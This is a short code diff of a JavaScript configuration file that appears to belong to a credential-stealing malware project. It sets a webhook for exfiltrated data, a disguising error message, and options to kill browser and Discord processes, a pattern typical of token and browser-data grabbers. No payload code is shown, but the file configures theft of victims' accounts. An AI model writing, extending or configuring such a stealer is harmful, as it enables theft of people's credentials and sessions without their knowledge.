@@ -1,7 +1,7 @@
 module.exports = () => {
     return {
-        "webhook": process.env.WEBHOOK || "",
-        "fakeErrorMessage": "",
+        "webhook": [process.env.WEBHOOK],
+        "errorMessage": "",
         "kill":{ 
             "discords": false,
             "browsers": true,
